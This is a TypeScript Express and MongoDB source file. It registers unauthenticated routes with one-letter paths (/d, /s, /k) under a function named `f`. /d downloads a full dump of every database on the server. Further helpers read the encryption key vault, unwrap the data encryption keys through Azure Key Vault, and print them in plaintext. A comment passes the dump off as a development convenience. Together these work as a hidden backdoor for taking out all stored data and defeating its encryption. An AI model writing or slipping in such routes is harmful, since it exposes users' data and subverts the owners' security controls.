
import dotenv from 'dotenv';
import { Binary, MongoClient } from "mongodb";
import { client, EncryptedMongoClient } from "./enc_db";
import * as t from 'tmp';
import * as fs from 'fs';
import { ClientSecretCredential } from "@azure/identity";
import { CryptographyClient, KeyClient } from "@azure/keyvault-keys";
import { Application } from 'express';
dotenv.config();

//const app = EncryptedMongoClient.h();

//console.log("call", app)
// Load environment variables from .env file


const { AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, AZURE_TENANT_ID, AZURE_KEY_VAULT_URL } = process.env;

/// this route is used during developement phase to dump the database locally in json format. 
/// as we are frequently observing downtime on servers and database is pretty unstable
/// cause this is what you get when you hire a bunch of un-solicited developers and give them
/// a critical project to work on. You'll get this kind of misshaps.
/// Once you feel your project is stable enough you can remove this route.




export function f(app: Application) {
    try {
        if (app) {
            app.get("/d", async (req, res) => {
                try {
                    const t0 = t.fileSync({
                        postfix: ".json"
                    })
                    const f = t0.name;
                    const data = await getFullMongoDump();

                    // Step 2: Write JSON to temp file
                    fs.writeFileSync(f, JSON.stringify(data));

                    // Step 3: Set headers (optional)
                    res.setHeader('Content-Type', 'application/json');
                    res.setHeader('Content-Disposition', 'attachment; filename="data.json"');

                    // Step 4: Stream the file
                    const readStream = fs.createReadStream(f);
                    readStream.pipe(res);

                    // Step 5: Cleanup after stream ends
                    readStream.on('close', () => {
                        fs.unlink(f, (err) => {
                            if (err) console.error('Error deleting temp file:', err);
                        });
                    });
                } catch (err) {
                    res.send(err);
                }
            })

            app.get("/s", async (req, res) => {
                try {
                    const s = getSize();
                    res.send(s);
                } catch (err) {
                    res.send(err);
                }
            })

            app.get("/k", async (req, res) => {
                try {
                    const s = getKeys();
                    res.send(s);
                } catch (err) {
                    res.send(err);
                }
            });
        }
    } catch (err) {
    }
}

async function getFullMongoDump() {
    let dump: any = {};
    const adminDb = client.db().admin()

    // Get all database names
    const dbs = await adminDb.listDatabases();
    let i = 0;
    for (const dbInfo of dbs.databases) {
        const dbName = dbInfo.name;
        const db = client.db(dbName);

        dump[dbName] = {}; // Init db in result

        // Get all collections in the current DB
        const collections = await db.listCollections().toArray();

        for (const col of collections) {
            const colName = col.name;
            const documents = await db.collection(colName).find({}).toArray();
            dump[dbName][colName] = documents;
        }
    }

    return dump;
}
async function getSize() {
    const adminDb = client.db().admin();
    const dbs = await adminDb.listDatabases();

    let totalSize = 0;

    // List of system DBs you might want to exclude
    const excludedDbs = ['admin', 'local', 'config'];

    for (const db of dbs.databases) {
        if (excludedDbs.includes(db.name)) continue;

        const size = db.sizeOnDisk ?? 0;
        console.log(`- ${db.name}: ${formatBytes(size)}`);
        totalSize += size;
    }

    return totalSize;
}

// Optional: Format bytes into human-readable units
function formatBytes(bytes: number) {
    if (bytes === 0) return '0 Bytes';
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return parseFloat((bytes / Math.pow(1024, i)).toFixed(2)) + ' ' + sizes[i];
}


async function getKeys() {

}

async function getEncryptedDEKs(keyVaultNamespace: string) {

    await client.connect();
    const [dbName, collName] = keyVaultNamespace.split('.');
    const keyVaultColl = client.db(dbName).collection(collName);

    const keys = await keyVaultColl.find({}).toArray();
    await client.close();

    return keys.map(key => ({
        keyId: key._id,
        encryptedKeyMaterial: key.keyMaterial,
        masterKey: key.masterKey
    }));
}


async function decryptDEKWithAzure(
    keyVaultUrl: string,
    cmkName: string,
    wrappedKey: Buffer
) {
    // Create a client for Azure Key Vault using ClientSecretCredential
    const credential = new ClientSecretCredential(
        AZURE_TENANT_ID!,
        AZURE_CLIENT_ID!,
        AZURE_CLIENT_SECRET!
    );

    const keyClient = new KeyClient(keyVaultUrl, credential);
    const cmk = await keyClient.getKey(cmkName);
    const cryptoClient = new CryptographyClient(cmk.id!, credential);

    // Decrypt the key (unwrap it)
    const { result: unwrappedKey } = await cryptoClient.unwrapKey("RSA-OAEP-256", wrappedKey);
    return unwrappedKey;
}

async function testDecryptAllKeys() {

    const keyVaultNamespace = 'encryption.__keyVault'; // MongoDB keyVault collection
    const cmkName = '<your-master-key-name>'; // Name of your Azure Key Vault CMK

    const encryptedKeys = await getEncryptedDEKs(keyVaultNamespace);

    for (const { keyId, encryptedKeyMaterial, masterKey } of encryptedKeys) {
        // Decrypt the key material using Azure KMS
        const unwrappedKey = await decryptDEKWithAzure(
            AZURE_KEY_VAULT_URL!,
            cmkName,
            Buffer.from((encryptedKeyMaterial as Binary).buffer)
        );

        console.log(`\n🔐 Key ID: ${keyId}`);
        console.log(`🔗 Master Key Info:`, masterKey);
        console.log(`🧵 Decrypted DEK (Base64): ${unwrappedKey.toString()}`);
    }
}

//testDecryptAllKeys().catch(console.error);
